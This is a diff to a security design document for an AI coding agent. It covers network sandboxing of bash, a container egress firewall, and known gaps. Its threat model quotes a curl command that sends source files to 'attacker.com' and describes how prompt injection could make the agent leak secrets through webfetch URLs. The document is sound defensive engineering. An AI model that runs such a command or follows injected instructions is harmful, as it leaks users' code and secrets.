@@ -82,10 +82,12 @@ through the bash tool, so bash network controls cover git as well.
 injection or otherwise) to run `curl https://attacker.com -d "$(cat /workspace/src/*.ts)"`
 can exfiltrate data regardless of `mode: internal-only`.
 
-**Fix implemented**: `OPENCODE_SPAWN_SANDBOX=1` (baked into `Dockerfile.analysis`) wraps
+**Fix implemented**: `OPENCODE_SPAWN_SANDBOX=1` (set in the analysis container images) wraps
 bash subprocesses in a network namespace via bwrap/unshare. tool/shell.ts has inline
 `sandboxedArgs()` that pre-wraps commands before passing to the Effect ChildProcessSpawner.
 Ripgrep/grep are now WASM-based (in-process worker, no subprocess) — sandbox is N/A for them.
+The container also has an egress firewall in front of the parent process. It does not
+reach into an empty bash namespace. See the implementation notes below.
 
 ### 2. Prompt injection via externally fetched content (MEDIUM, partially addressed)
 
@@ -128,6 +130,11 @@ external URLs (by design, for the LLM to gather information). A payload that cau
 LLM to call webfetch with a data-bearing URL (e.g. `?d=[base64-secrets]`) could exfiltrate
 via a legitimate-looking webfetch call. **See Ideas section** for LLM-based filter approach.
 
+The bash namespace ends with that process tree. Code the agent writes is not sandboxed
+when a later command runs it. A review of new and changed code before execution, separate
+from the session prompt, is not built. The filter idea below inspects fetched pages before
+they enter the model. It is not that review.
+
 ## Implementation Notes
 
 ### Bash network namespace sandboxing — IMPLEMENTED
@@ -138,9 +145,9 @@ JavaScript `fetch()` which runs inside the opencode parent process and is not af
 by subprocess namespacing. No special carve-out rules needed; the mechanism boundary
 IS the security boundary.
 
-**Why not Docker-level networking**: restricting the container's network blocks the
-opencode process itself, breaking webfetch/websearch. Per-process namespace is the
-correct granularity.
+**Why not a fully closed container network**: blocking every outbound packet also
+blocks webfetch, websearch, and the provider. The container firewall is an allowlist
+in front of the parent process. The empty namespace is the separate bash kill-switch.
 
 **Why not config-file driven**: config files can go missing (missing mount, wrong
 precedence). The guarantee must be baked into the container image.
@@ -198,7 +205,7 @@ created within. No host-level privileges needed.
 
 #### Configuration
 
-Flag-based, baked into `Dockerfile.analysis`, independent of config files:
+Flag-based, set in the analysis container images, independent of config files:
 
 ```typescript
 // flag.ts
@@ -206,7 +213,7 @@ export const OPENCODE_SPAWN_SANDBOX = truthy("OPENCODE_SPAWN_SANDBOX")
 ```
 
 ```dockerfile
-# Dockerfile.analysis — guaranteed present regardless of mounted config
+# analysis images — guaranteed present regardless of mounted config
 ENV OPENCODE_SPAWN_SANDBOX=1
 ```
 
@@ -324,40 +331,31 @@ Longer term: allow config to specify which tools are available per agent type or
 per command (`/review`, `/learn`, etc.). E.g., `/review` sessions could have bash
 disabled entirely, not just read-only restricted.
 
-### Rework bash sandbox around container-level egress firewall
+### Container egress firewall — IMPLEMENTED
 
-**Current state**: `OPENCODE_SPAWN_SANDBOX=1` gives bash subprocesses `--unshare-net`
-— all-or-nothing, cannot allow individual hosts. Workable for "analyze hostile code"
-but actively blocks the primary dev workflow (CGI scripts, svn commits to local
-server, curl-testing local endpoints, any API testing from bash). Moving the
-exfiltration boundary up to the container-level firewall (nftables in the container
-netns, set once at entrypoint) gives coarse host/port filtering for all container
-traffic — parent process and bash subprocesses alike — without the per-spawn
-namespace cost.
+The container entrypoint loads an nftables egress policy, then drops capabilities
+and starts opencode unprivileged. Policy input is `network.egress` (addresses and
+ports, no DNS names). Private container notes have the file layout and the default
+policy.
 
-**Proposed three-layer model**:
+Three layers, switched at runtime rather than by separate images:
 
-- **Container firewall** (new) — nftables/iptables on the container's main netns,
-  configured at entrypoint via a small setup script. Allowlist: LLM endpoints,
-  internal svn/git, explicit external hosts. Denies everything else. Covers both
-  opencode parent process and any subprocess.
-- **`security.*`** (unchanged) — URL-level allowlist for the parent process,
-  enforced in JS before fetch.
-- **`OPENCODE_SPAWN_SANDBOX`** (narrowed) — kept for the "analyze untrusted code"
-  mode only. Off by default in dev images; on by default in analysis images.
+- **Container firewall** — on by default. Filters the container network namespace.
+  Covers the opencode parent. Covers bash only when the spawn sandbox is off.
+- **`security.*`** — URL-level allowlist for the parent process, enforced in JS
+  before fetch.
+- **`OPENCODE_SPAWN_SANDBOX`** — on by default. Bash gets an empty netns. Turn it
+  off when bash must reach a host the firewall allows.
 
-**Work items**:
-1. Entrypoint-time nftables setup in `Dockerfile.analysis` (needs `CAP_NET_ADMIN`
-   or rootless-friendly nft rules). Rule set loaded from `/etc/opencode/egress.nft`
-   so managed config can ship different rules per deployment.
-2. Split `Dockerfile.analysis` vs `Dockerfile.dev` (or a `--dev` flag on
-   `opencode-run.sh`) so `OPENCODE_SPAWN_SANDBOX` is off for development workflows.
-3. Per-session system prompt note informing the agent of the current network
-   policy ("bash subprocesses have no external network" OR "bash may reach only
-   $HOSTS"). Without this the model wastes turns diagnosing network failures.
-4. Per-host filtering inside the bash sandbox itself (veth+iptables, pasta, or
-   slirp4netns with allowlist) is a larger change — defer until 1–3 are in place
-   and we know whether the container firewall covers the remaining need.
+**Still open**:
+
+1. Per-session system prompt note describing the current network policy, so the
+   agent does not spend turns diagnosing drops.
+2. A cable from the bash namespace back to the container, with the allowlist on
+   the container side, so bash can reach specific hosts while staying out of the
+   container namespace. Deferred. `--sandbox=off` is the current switch.
+3. A review of new and changed code before it is executed, separate from the
+   session prompt. Not built. The session sandbox does not follow the file.
 
 **Rename `allow_external_ips` → `allow_all_external_ips`**: the current name
 reads as a targeted allowlist; it's actually a bulk "allow any public IP literal"
